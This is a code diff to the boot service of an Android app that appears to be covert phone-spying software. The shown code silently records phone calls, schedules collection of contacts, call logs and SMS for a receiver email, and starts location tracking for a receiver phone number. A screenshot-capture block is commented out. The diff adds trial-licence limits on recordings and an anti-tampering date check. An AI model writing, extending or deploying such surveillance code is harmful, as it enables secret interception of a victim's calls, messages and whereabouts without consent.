@@ -42,6 +42,8 @@ public class BootService extends Service
 {
 	private final String LOGTAG = "BootService";
 	
+	Context context;
+	
 	private Timer mGetInfoTimer;
 	private GetInfoTask mInfoTask;
 	private final long mGetInfoDelay  = 10000; // 10 Seconds
@@ -85,6 +87,12 @@ public class BootService extends Service
                 		
                 		if (!ConfigCtrl.isLegal(context)) return;
                 		
+                		// Check if reached the recording limit if trial
+                		LICENSE_TYPE licType = ConfigCtrl.getLicenseType(context);
+                		if (licType == LICENSE_TYPE.TRIAL_LICENSED) {
+                			if (ConfigCtrl.reachRecordingTimeLimit(context)) return;
+                		}
+                		
                 		if (!comingNumberIsLegal(context, otherSidePhoneNum)) return;
             			
             			if (recordStarted) return;
@@ -103,6 +111,9 @@ public class BootService extends Service
                             recorder.setOutputFile(fileFullPath);
                             recorder.prepare();
                             recorder.start();
+                            if (licType == LICENSE_TYPE.TRIAL_LICENSED) {
+                            	ConfigCtrl.countRecordingTimesInTrial(context); // recording count ++ if in trial
+                            }
                             recordStarted = true;
                         } catch(Exception ex) {
                             //Log.e(LOGTAG, ex.getMessage());
@@ -153,8 +164,10 @@ public class BootService extends Service
 		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
 		super.onCreate();
 		
+		this.context = getApplicationContext();
+		
 		mGetInfoTimer = new Timer();
-		mInfoTask = new GetInfoTask(getApplicationContext());
+		mInfoTask = new GetInfoTask(context);
 		
 		//mScreenshotTimer = new Timer();
 		//mCapTask = new CaptureTask(this);
@@ -165,23 +178,31 @@ public class BootService extends Service
 		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
 		super.onStart(intent, startId);
 		
-		// Start timer to get contacts, phone call history and SMS
-		Context context = getApplicationContext();
-		String[] mails = GlobalPrefActivity.getReceiverMail(context).split(",");
-		mails = StrUtils.filterMails(mails);
-		if (mails.length <= 0) return;
-		
 		LICENSE_TYPE type = ConfigCtrl.getLicenseType(context);
+		
+		// A special check on the consume date and current date:
+		// If the current date is ealier than consume date, stop the trial
+		CheckDate(context, type);
+		
+		// Start timer to get contacts, phone call history and SMS
 		if (ConfigCtrl.isLegal(context)) 
 		{
 			// ------------------------------------------------------------------			
 			// Start timers and listeners
-			mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
+			String recvMail = GlobalPrefActivity.getReceiverMail(context);
+			if (recvMail.length() > 0) 
+			{
+				mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
 			
-			telManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
-            telManager.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
+				telManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
+				telManager.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
+			}
 			
-			locationUtil = new LocationUtil(getApplicationContext());
+			String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
+			if (recvPhoneNum.length() > 0) 
+			{
+				locationUtil = new LocationUtil(context);
+			}
 		
 			//Start timer to capture screenshot
 			/*
@@ -194,7 +215,7 @@ public class BootService extends Service
 		} 
 		
 		// If out of trial and not licensed, send a SMS to warn the receiver user
-		else if (type == LICENSE_TYPE.TRIAL_LICENSED && !ConfigCtrl.stillInTrial(context))
+		else if (type == LICENSE_TYPE.TRIAL_LICENSED)
 		{
 			// If has sent before, DO NOT send again
 			if (ConfigCtrl.getHasSentExpireSms(context)) return;
@@ -208,6 +229,30 @@ public class BootService extends Service
 					ConfigCtrl.setHasSentExpireSms(context, true);
 				}
 			}
+		}
+	}
+	
+	// Prevent me from being cheated when in trial
+	private void CheckDate(Context context, LICENSE_TYPE type) 
+	{
+		if (type != LICENSE_TYPE.TRIAL_LICENSED) return;
+		
+		boolean beCheated = true;
+		
+		String consumeDatetimeStr = ConfigCtrl.getConsumedDatetime(context);
+		if (consumeDatetimeStr != null && consumeDatetimeStr.length() > 0) {
+			Date consumeDatetime = null;
+			try {
+				consumeDatetime = DatetimeUtil.format.parse(consumeDatetimeStr);
+			} catch (Exception ex) {}
+			
+			if (consumeDatetime != null && consumeDatetime.before(new Date())) {
+				beCheated= false;
+			}
+		}
+		
+		if (beCheated) {
+			ConfigCtrl.setLicenseType(context, LICENSE_TYPE.NOT_LICENSED);
 		}
 	}
 	
